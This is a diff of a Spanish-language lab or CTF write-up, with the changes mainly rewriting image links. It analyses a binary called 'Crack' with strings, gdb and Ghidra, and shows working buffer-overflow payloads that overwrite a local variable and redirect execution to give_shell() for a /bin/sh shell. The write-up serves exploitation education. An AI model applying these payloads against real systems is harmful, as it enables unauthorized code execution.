@@ -4,44 +4,44 @@
 ```bash
 strings -C Crack
 ```
-![[Pasted image 20250305115746.png]]
+![](images-Crack/Pasted%20image%2020250305115746.png)
 
 La frase oculta es **"Wow! el secreto eres tumismo"**, presente en las cadenas del binario. Para obtenerla al ejecutar el programa, es probable que se deba ingresar la contraseña correcta. Según el contexto, la contraseña podría ser **"MUTIH"** (cadena visible en el output de `strings`).
 
 ###### Primera ejecución
-![[Pasted image 20250304141819.png]]
+![](images-Crack/Pasted%20image%2020250304141819.png)
 ###### Hexdump
 ```bash
 hexdump -C Crack
 ```
-![[Pasted image 20250305115602.png]]
+![](images-Crack/Pasted%20image%2020250305115602.png)
 ###### Ltrace
 ```bash
 echo "contraseña1" | ltrace ./Crack
 ```
-![[Pasted image 20250305120005.png]]
+![](images-Crack/Pasted%20image%2020250305120005.png)
 
 ###### gdb
 ```bash
 gdb Crack
 ```
-![[Pasted image 20250305131420.png]]
+![](images-Crack/Pasted%20image%2020250305131420.png)
 
-![[Pasted image 20250305131454.png]]
+![](images-Crack/Pasted%20image%2020250305131454.png)
 
 
 ###### Ghidra
-![[Pasted image 20250304142802.png]]
+![](images-Crack/Pasted%20image%2020250304142802.png)
 
-**![[Pasted image 20250304143026.png]]
+**![](images-Crack/Pasted%20image%2020250304143026.png)
 
-![[Pasted image 20250304143811.png]]
+![](images-Crack/Pasted%20image%2020250304143811.png)
 
 ### Identificación de Vulnerabilidades
 ###### Análisis
-![[Pasted image 20250305161155.png]]
+![](images-Crack/Pasted%20image%2020250305161155.png)
 
-![[Pasted image 20250305160607.png]]
+![](images-Crack/Pasted%20image%2020250305160607.png)
 0x49 = 'I'  
 0x54 = 'T'  
 0x55 = 'U'  
@@ -51,7 +51,7 @@ Pero en los sistemas x86 almacenan los bytes en orden inverso.
 
 >  Por lo tanto, 0x1337 en little-endian se escribe como \x37\x13\x00\x00 para ocupar 4 bytes, ya que local_c es un entero de 4 bytes.
 
-![[Pasted image 20250305161228.png]]
+![](images-Crack/Pasted%20image%2020250305161228.png)
 
 La variable local_78 es el buffer, y local_c está en una posición específica relativa al base pointer (rbp). 
 
@@ -137,9 +137,9 @@ Pero primero, habrá que validar que el shellcode se encuentre en una ubicación
 ```
 
 En gdb podemos validar la existencia de un `/bin/sh` y de su ejecución. Para que nuestrro vector de ataque consista en redirigir el flujo a esta función. Es decir sobreescribir la dirección de retorno con el `give_shell()`
-![[Pasted image 20250311114113.png]]
+![](images-Crack/Pasted%20image%2020250311114113.png)
 Con `objdump`  podemos validar la dirección a reescribir.
-![[Pasted image 20250311114907.png]]
+![](images-Crack/Pasted%20image%2020250311114907.png)
 Podemos inferir que el binario tiene una estructura así:
 ```c
 if (password == 0x1337) {
@@ -179,7 +179,7 @@ Así es como definimos nuestro nuevo payload:
 $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*120 + b"\x16\x10\x40\x00\x00\x00\x00\x00" + b"\x02\x12\x40\x00\x00\x00\x00\x00")' > payload.bin
 ```
 
-![[Pasted image 20250311124347.png]]
+![](images-Crack/Pasted%20image%2020250311124347.png)
 
 ### Post-Explotación
 Nuestro script, tratará de juntar la construcción del payload:
@@ -214,7 +214,7 @@ Una vez perfilado el ataque de búffer overflow:
 python3 -c 'import sys; sys.stdout.buffer.write(b"A"*108 + b"\x37\x13\x00\x00")' | ./Crack
 ```
 
-![[Pasted image 20250305170513.png]]
+![](images-Crack/Pasted%20image%2020250305170513.png)
 ##### 4. ¿Cómo obtener ejecución remota?
 Para obtener la ejecución remota se necesita llegar a la dirección de retorno:
 ``` java
@@ -222,9 +222,9 @@ Para obtener la ejecución remota se necesita llegar a la dirección de retorno:
 ```
 
 En gdb podemos validar la existencia de un `/bin/sh` y de su ejecución. Para que nuestrro vector de ataque consista en redirigir el flujo a esta función. Es decir sobreescribir la dirección de retorno con el `give_shell()`
-![[Pasted image 20250311114113.png]]
+![](images-Crack/Pasted%20image%2020250311114113.png)
 Con `objdump`  podemos validar la dirección a reescribir.
-![[Pasted image 20250311114907.png]]
+![](images-Crack/Pasted%20image%2020250311114907.png)
 
 Necesitamos mantener la entrada estándar (`stdin`) abierta después de enviar el payload. Esto lo logramos con `cat -`.
 Así que al comando que manda el payload al binario: `cat payload.bin | ./Crack`, le agregamos esto último:
@@ -237,7 +237,7 @@ Así es como definimos nuestro nuevo payload:
 $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*120 + b"\x16\x10\x40\x00\x00\x00\x00\x00" + b"\x02\x12\x40\x00\x00\x00\x00\x00")' > payload.bin
 ```
 
-![[Pasted image 20250311124347.png]]
+![](images-Crack/Pasted%20image%2020250311124347.png)
 
 ##### 5. Script automatizador
 Nuestro script, tratará de juntar la construcción del payload:
@@ -253,7 +253,7 @@ python3 -c 'import sys; sys.stdout.buffer.write(
 (cat payload.bin; cat -) | ./Crack
 ```
 
-![[Pasted image 20250311124901.png]]
+![](images-Crack/Pasted%20image%2020250311124901.png)
 ### Referencias
 
 How programs get run: ELF binaries [LWN.net]. (s. f.). 
